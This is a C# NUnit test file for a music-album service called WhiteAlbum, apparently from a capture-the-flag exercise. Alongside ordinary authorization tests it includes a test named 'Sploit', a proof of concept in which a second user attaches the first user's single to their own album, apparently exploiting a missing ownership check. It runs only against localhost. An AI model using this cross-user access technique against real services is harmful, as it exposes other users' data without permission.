using System;
using System.Threading.Tasks;
using DoNotIncludeThisPlease.Client;
using FluentAssertions;
using FluentAssertions.Extensions;
using NUnit.Framework;
using Vostok.Configuration.Sources.Object;
using Vostok.Hosting;
using Vostok.Hosting.Setup;
using Vostok.Logging.Console;
using WhiteAlbum;
using WhiteAlbum.Entities;
using WhiteAlbum.Entities.Users;
using WhiteAlbum.Requests;
using WhiteAlbum.Tracks;

namespace DoNotIncludeThisPlease
{
    public class Tests
    {
        private UserId userId;
        private UserName userName;
        private AlbumId albumId;
        private AlbumName albumName;
        private Client.Client client;
        private VostokHost host;
        private UserId? userId2;
        private UserName? userName2;
        private AlbumId? albumId2;
        private AlbumName? albumName2;

        [SetUp]
        public void SetUp()
        {
            void EnvironmentSetup(IVostokHostingEnvironmentBuilder builder)
            {
                builder
                    .SetupApplicationIdentity(
                        identityBuilder => identityBuilder
                            .SetEnvironment("environment")
                            .SetProject("White")
                            .SetApplication("Album")
                            .SetInstance("0"))
                    .SetupLog(logBuilder => logBuilder.SetupConsoleLog())
                    .SetPort(1234);
            }
            
            host = new VostokHost(new VostokHostSettings(new WhiteAlbumApplication(), EnvironmentSetup));

            host.WithConsoleCancellation().StartAsync().GetAwaiter().GetResult();
            
            userId = new UserId(Guid.NewGuid());
            userName = new UserName($"user_nemu_{userId.Id}");
            
            userId2 = new UserId(Guid.NewGuid());
            userName2 = new UserName($"user_nemu_{userId.Id}");
            
            albumId = new AlbumId(Guid.NewGuid());
            albumName = new AlbumName($"album_name_{albumId.Id}");
            
            albumId2 = new AlbumId(Guid.NewGuid());
            albumName2 = new AlbumName($"album_name_{albumId2.Id}");
            
            var log = new SynchronousConsoleLog();
            var authProvider = new AsyncLocalAuthProvider();

            client = new Client.Client("http://localhost:1234/", authProvider, log);
        }
        
        [Test]
        public async Task Should_not_fail_when_get_authorized()
        {
            var userToken = (await client.UsersClient.Create(new CreateUserRequest(userId, userName), 60.Seconds())).Result;

            ApiKey.Set(userToken.Id.ToString());
        
            var createAlbumRequest = new CreateAlbumRequest(albumId, albumName, new AlbumMeta(null, null));

            var createResult = (await client.AlbumClient.Create(createAlbumRequest, 60.Seconds()));

            ApiKey.Set(null);
            
            var getResult = (await client.AlbumClient.Get(new GetAlbumRequest(albumId), 60.Seconds())).Result;
            
            Console.WriteLine($"alnum : {getResult.Name}");
            
            await host.StopAsync();
        }
        
        [Test]
        public async Task Should_fail_when_get_unautorized()
        {
            var userToken = (await client.UsersClient.Create(new CreateUserRequest(userId, userName), 60.Seconds())).Result;

            ApiKey.Set(userToken.Id.ToString());
        
            var createAlbumRequest = new CreateAlbumRequest(albumId, albumName, new AlbumMeta(null, null));

            var createResult = (await client.AlbumClient.Create(createAlbumRequest, 60.Seconds()));

            ApiKey.Set(null);
            
            var getResult = (await client.AlbumClient.Get(new GetAlbumRequest(albumId), 60.Seconds())).Result;
            
            Console.WriteLine($"alnum : {getResult.Name}");
            
            await host.StopAsync();
        }
        
        [Test]
        public async Task Sploit()
        {
            var userToken = (await client.UsersClient.Create(new CreateUserRequest(userId, userName), 60.Seconds())).Result;

            ApiKey.Set(userToken.Id.ToString());
        
            var createAlbumRequest = new CreateAlbumRequest(albumId, albumName, new AlbumMeta(null, null));

            var createResult = (await client.AlbumClient.Create(createAlbumRequest, 60.Seconds()));
            
            createResult.EnsureSuccess();
            
            var getResult = (await client.AlbumClient.Get(new GetAlbumRequest(albumId), 60.Seconds()));
            
            getResult.EnsureSuccess();

            var singleId = new SingleId(Guid.NewGuid());
            var singleName = new SingleName($"single_name_{singleId}");
            var createSingleRequest = new CreateSingleRequest(singleId, new SingleMeta("author", null), singleName, new Track());
            var createSingleResult = (await client.SinglesClient.Create(createSingleRequest, 60.Seconds()));
            
            createSingleResult.EnsureSuccess();
            
            var attachResult = await client.AlbumClient.Attach(new AttachSingleToAlbumRequest(singleId, albumId), 60.Seconds());
            attachResult.EnsureSuccess();
            
            // ApiKey.Set(null);

            
            ApiKey.Set(null);
            
            var userToken2 = (await client.UsersClient.Create(new CreateUserRequest(userId2, userName2), 60.Seconds())).Result;
            
            ApiKey.Set(userToken2.Id.ToString());
            
            var createAlbumRequest2 = new CreateAlbumRequest(albumId2, albumName2, new AlbumMeta(null, null));

            var createResult2 = (await client.AlbumClient.Create(createAlbumRequest2, 60.Seconds()));
            
            createResult2.EnsureSuccess();
            
            var getResult2 = (await client.AlbumClient.Get(new GetAlbumRequest(albumId2), 60.Seconds()));
            
            getResult2.EnsureSuccess();
            
            var singleId2 = new SingleId(Guid.NewGuid());
            // var singleName2 = new SingleName($"single_name2_{singleId2}");
            var singleName2 = singleName;
            var createSingleRequest2 = new CreateSingleRequest(singleId2, new SingleMeta("author2", null), singleName2, new Track());
            var createSingleResult2 = (await client.SinglesClient.Create(createSingleRequest2, 60.Seconds()));
            
            createSingleResult2.EnsureSuccess();

            // var getSingleResult = (await client.SinglesClient.Get(new GetSingleRequest(singleId2), 60.Seconds()));
            // Console.WriteLine($"signa :{getSingleResult.Result.Signature}");
            
            
            var attachResult2 = await client.AlbumClient.Attach(new AttachSingleToAlbumRequest(singleId, albumId2), 60.Seconds());
            // var attachResult2 = await client.AlbumClient.Attach(new AttachSingleToAlbumRequest(singleId2, albumId2), 60.Seconds());
            attachResult2.EnsureSuccess();
            
            var getSingle2 = await client.AlbumClient.GetAllSingles(new GetAllSinglesRequest(albumId2), 60.Seconds());
            getSingle2.EnsureSuccess();
            
            foreach (var single in getSingle2.Result)
            {
                Console.WriteLine($"result :| {single.Id.Id}");
            }
            
            
            Console.WriteLine($"singleId  : {singleId.Id}");
            Console.WriteLine($"singleId2 : {singleId2.Id}");
            
            await host.StopAsync();
        }
    }
}